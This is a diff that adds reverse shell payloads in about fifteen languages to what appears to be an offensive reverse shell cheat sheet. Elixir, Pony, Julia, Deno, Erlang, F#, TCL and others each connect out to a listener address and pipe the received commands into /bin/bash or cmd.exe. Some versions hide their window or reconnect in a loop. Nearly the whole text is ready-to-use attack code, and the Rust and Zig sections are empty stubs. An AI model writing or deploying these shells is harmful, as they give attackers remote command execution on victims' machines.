@@ -31,6 +31,24 @@
     * [Socat](#socat)
     * [Telnet](#telnet)
     * [War](#war)
+    * [Elixir](#elixir)
+    * [Pony](#pony)
+    * [Julia](#julia)
+    * [Chicken](#chicken)
+    * [Deno](#deno)
+    * [Rust](#rust)
+    * [Rakudo](#rakudo)
+    * [Crystal](#crystal)
+    * [D](#d)
+    * [V](#v)
+    * [Godot](#godot)
+    * [Love2d](#love2d)
+    * [Nim](#nim)
+    * [Rust](#rust)
+    * [Erlang](#erlang)
+    * [F#](#fsharp)
+    * [TCL](#tcl)
+    * [Zig](#zig)
 * [Meterpreter Shell](#meterpreter-shell)
     * [Windows Staged reverse TCP](#windows-staged-reverse-tcp)
     * [Windows Stageless reverse TCP](#windows-stageless-reverse-tcp)
@@ -445,6 +463,464 @@ main() {
   });
 }
 ```
+
+
+### Elixir
+
+NOTES: https://github.com/Potato-Industries/elixrs
+
+```
+defmodule Elixrs do
+   def main do
+      case :gen_tcp.connect({192,168,8,139}, 9090, [:binary, active: false, send_timeout: 5000]) do
+         {:ok, sock} -> 
+            loop(sock)
+         _ ->
+            :timer.sleep(5000) 
+            main()
+      end
+   end
+
+   def loop(sock) do
+      case :gen_tcp.recv(sock, 0) do
+         {:ok, data} ->
+            :gen_tcp.send(sock, System.cmd("/bin/bash", ["-c", data]) |> Tuple.to_list) 
+            loop(sock)
+         {:error, Reason} ->
+            main()
+         _ ->
+            None
+      end
+   end
+end
+
+Elixrs.main
+
+```
+
+### Pony
+
+NOTES: https://github.com/Potato-Industries/prs
+
+```
+use "net"
+use "process"
+use "files"
+
+class ReadNotify is TCPConnectionNotify
+  let _env: Env
+
+  new create(env: Env) =>
+    _env = env
+
+  fun ref received(
+    conn: TCPConnection ref,
+    data: Array[U8] iso,
+    times: USize)
+    : Bool
+  =>
+    let client = WriteNotify(conn)
+    let notifier: ProcessNotify iso = consume client
+    try
+      let path = FilePath(_env.root as AmbientAuth, "/bin/bash")?
+      let args: Array[String] val = ["bash"]
+      let vars: Array[String] val = ["HOME=/"; "PATH=/bin"]
+      let auth = _env.root as AmbientAuth
+      let pm: ProcessMonitor = ProcessMonitor(auth, auth, consume notifier,
+      path, args, vars)
+      pm.write(consume data)
+    end
+    true
+
+  fun ref connect_failed(conn: TCPConnection ref) =>
+    None
+
+
+class WriteNotify is ProcessNotify
+  let _conn: TCPConnection
+
+  new iso create(conn: TCPConnection) =>
+    _conn = conn
+
+  fun ref stdout(process: ProcessMonitor ref, data: Array[U8] iso) =>
+    _conn.write(String.from_array(consume data))
+
+  fun ref stderr(process: ProcessMonitor ref, data: Array[U8] iso) =>
+    _conn.write(String.from_array(consume data))
+
+
+actor Main
+  new create(env: Env) =>
+    try
+      TCPConnection(env.root as AmbientAuth,
+        recover ReadNotify(env) end, "192.168.8.139", "9090")
+    end
+```
+
+### Julia
+
+NOTES: https://github.com/Potato-Industries/jrs
+
+```
+julia --eval 'using Sockets;c = connect("192.168.8.139", 9090);while true;cmd = readline(c, keep=true);try;println(c, read(`/bin/bash -c $cmd`, String));catch e;print(c, e);end;end'
+```
+
+### Chicken
+
+NOTES: https://github.com/Potato-Industries/chickenrs
+
+```
+(import (chicken tcp) (chicken io) (chicken process))
+(define-values (sr sw) (tcp-connect "192.168.8.139" 9090))
+(define-values (pr pw ps) (process "/bin/bash"))
+
+(define (lines)
+  (let ((x (read-line pr)))
+    (if (not (equal? x "[ENDEND]"))
+      (begin
+        (print x)
+        (write-line x sw)
+        (lines)))))
+
+(define (loop)
+(write-line (string-append (read-line sr) "; echo '[ENDEND]'") pw)
+(lines)
+(loop))
+
+(loop)
+
+```
+
+### Deno
+
+NOTES: https://github.com/Potato-Industries/denors
+
+```
+const c = await Deno.connect({ hostname: "192.168.8.139", port: 9090, transport: "tcp" });
+while(1) {
+    let buf=new Uint8Array(1024);
+    const n=await c.read(buf) || 0;
+    buf=buf.slice(0, n);
+    const cmd = new TextDecoder().decode(buf);
+    
+    const p = Deno.run({
+      cmd: ["/bin/bash", "-c", cmd],
+      stdout: "piped",
+      stderr: "piped"
+    });
+
+    const { code } = await p.status();
+    const rawOutput = await p.output();
+    const rawError = await p.stderrOutput();
+
+    if (code === 0) {
+       await c.write(rawOutput);
+    } else {
+       await c.write(rawError);
+    }
+}
+
+```
+
+### Rakudo
+
+NOTES: https://github.com/Potato-Industries/rrs
+
+```
+await IO::Socket::Async.connect('localhost', 9090).then( -> $promise {
+    while 1 {
+        given $promise.result {
+            react {
+                whenever .Supply() -> $v {
+                    my $p = shell $v, :out;
+                    my $o = $p.out.slurp(:close);
+                    .print($o);
+                    done;
+                 }
+             }
+        }
+    }
+    done;
+});
+```
+
+### Crystal
+
+NOTES: https://github.com/Potato-Industries/crs
+
+```
+require "process"
+require "socket"
+
+c = Socket.tcp(Socket::Family::INET)
+c.connect "192.168.1.38", 9090
+while true
+   m, l = c.receive
+   p = Process.new(m.rstrip('\n'), output: Process::Redirect::Pipe, shell: true)
+   c << p.output.gets_to_end
+end
+```
+
+### D
+
+NOTES: 
+
+```
+import std.process, std.socket;
+
+void main()
+{
+   Socket sock = new TcpSocket(new InternetAddress("192.168.1.38", 9090));
+   while (true)
+   {
+      char[] line;
+      char[1] buf;
+      while(sock.receive(buf))
+      {
+         line ~= buf;
+         if (buf[0] == '\n')
+            break;
+      }
+      if (!line.length)
+         break;
+
+      auto os = executeShell(line);
+      sock.send(os.output);
+   }
+}
+
+```
+
+### V
+
+NOTES: https://github.com/Potato-Industries/vrs
+
+```
+module main
+
+import net
+import io
+import os
+
+fn exec(path string) string {
+        mut out := ''
+        mut line := ''
+        mut cmd := os.Command{
+                path: path
+        }
+        cmd.start() or { panic(err) }
+
+        for {
+                line = cmd.read_line()
+                out += line + '\n'
+                if cmd.eof {
+                        return out
+                }
+        }
+        return out
+}
+
+fn main() {
+        mut conn := net.dial_tcp('localhost:8080') ?
+        mut reader := io.new_buffered_reader(reader: conn)
+        for {
+                result := reader.read_line() or { return }
+                conn.write_string(exec(result) + '\n') or { return }
+        }
+}
+
+```
+
+### Godot
+
+NOTES: https://github.com/Potato-Industries/godotrs
+
+```
+extends Node
+
+var client = StreamPeerTCP.new()
+
+func _ready():
+	OS.set_window_minimized(true)
+	set_process(true)
+	client.connect_to_host("192.168.1.101", 9999)
+        
+func _process(delta):
+	var bytes = client.get_available_bytes()
+	if bytes > 0:
+		var output = cmd(str(client.get_string(bytes)))
+		client.put_string(str(output))
+
+func cmd(cmd):
+	var output = []
+	#var pid = OS.execute('cmd.exe', ['/C', cmd], true, output)
+	var pid = OS.execute('/bin/sh', ['-c', cmd], true, output)
+	return output
+
+```
+
+### Love2d
+
+NOTES: https://github.com/Potato-Industries/lovers
+
+```
+love.window.close()
+
+function gogogo ()
+  local s=require("socket");
+  local t=assert(s.tcp());
+  t:connect("127.0.0.1", 80);
+  while true do
+    local r,x=t:receive();local f=assert(io.popen(r));
+    local b=assert(f:read("*a"));t:send(b);
+  end;
+  f:close();t:close();
+end
+
+if pcall(gogogo) then
+   love.event.quit()
+else
+   love.event.quit()
+end
+```
+
+### Nim
+
+NOTES: https://github.com/Potato-Industries/nimrs
+
+```
+import net, streams, osproc
+
+let c: Socket = newSocket()
+c.connect("127.0.0.1", Port(443))
+
+var p = startProcess("cmd.exe", options={poUsePath, poStdErrToStdOut, poEvalCommand, poDaemon})
+var input = p.inputStream()
+var output = p.outputStream()
+
+while true:
+  let cmds: string = c.recvLine()
+  #Linux/MacOS
+  #input.writeLine(cmds & ";echo 'DONEDONE'")
+  #Windows
+  input.writeLine(cmds & " & echo DONEDONE")
+  input.flush()
+  var o: string
+  while output.readLine(o):
+    if o == "DONEDONE":
+      break
+    c.send(o & "\r\L")
+
+```
+
+### Rust
+
+NOTES: https://github.com/Potato-Industries/rustrs
+
+### Erlang
+
+NOTES: https://github.com/Potato-Industries/erlrs
+
+```
+
+-module(erlrs).
+-export([main/0, loop/1]).
+
+main() ->
+    case gen_tcp:connect("127.0.0.1", 8080,
+                [{active,false},
+                {send_timeout, 5000},
+                {packet, line}]) of
+                              
+        {ok, Sock} ->
+            loop(Sock);
+        
+        {error, Reason} ->
+            timer:sleep(5000),
+            main()
+    end.
+
+loop(Sock) ->
+    case gen_tcp:recv(Sock, 0) of 
+        {ok, Data} ->
+	    gen_tcp:send(Sock, os:cmd(Data)),
+	    loop(Sock);
+        
+        {error, Reason} ->
+            main()
+    end.
+```
+
+### Fsharp
+
+NOTES: https://github.com/Potato-Industries/fsrs
+
+```
+open System
+open System.Net
+open System.Diagnostics
+
+let rec asyncStdin (stream: System.Net.Sockets.NetworkStream, cmd: Process) =
+    async {
+        let input = stream.ReadByte() |> Char.ConvertFromUtf32
+        cmd.StandardInput.Write(input)
+
+        return! asyncStdin (stream, cmd)
+    }
+
+let rec asyncStdout (stream: System.Net.Sockets.NetworkStream, cmd: Process) =
+    async {
+        let output = cmd.StandardOutput.Read() |> Char.ConvertFromUtf32
+        let outbyte = System.Text.Encoding.UTF32.GetBytes(output)
+        stream.Write(outbyte, 0, outbyte.Length)
+
+        return! asyncStdout (stream, cmd)
+    }
+
+let main =
+    let client = new System.Net.Sockets.TcpClient()
+    
+    client.Connect("127.0.0.1", 8080)
+
+    let stream = client.GetStream()
+
+    let procStartInfo = ProcessStartInfo (
+                         FileName = "cmd.exe",
+                         RedirectStandardInput = true,
+                         RedirectStandardOutput = true,
+                         RedirectStandardError = true,
+                         UseShellExecute = false,
+                         CreateNoWindow = true
+    )
+
+    let cmd = new Process(StartInfo = procStartInfo)
+    let err = cmd.Start()
+
+    asyncStdin (stream, cmd) |> Async.Start
+    asyncStdout (stream, cmd) |> Async.RunSynchronously
+
+    stream.Flush()
+    
+    System.Threading.Thread.Sleep(TimeSpan.FromSeconds(30.0))
+    
+main
+
+```
+
+### TCL
+
+```
+set chan [socket 192.168.8.139 9090]
+while 1 {
+   puts $chan [exec /bin/bash -c [gets $chan]]
+   flush $chan
+}
+```
+
+### Zig
+
+NOTES: https://github.com/Potato-Industries/zrs
+
 
 ## Meterpreter Shell
 
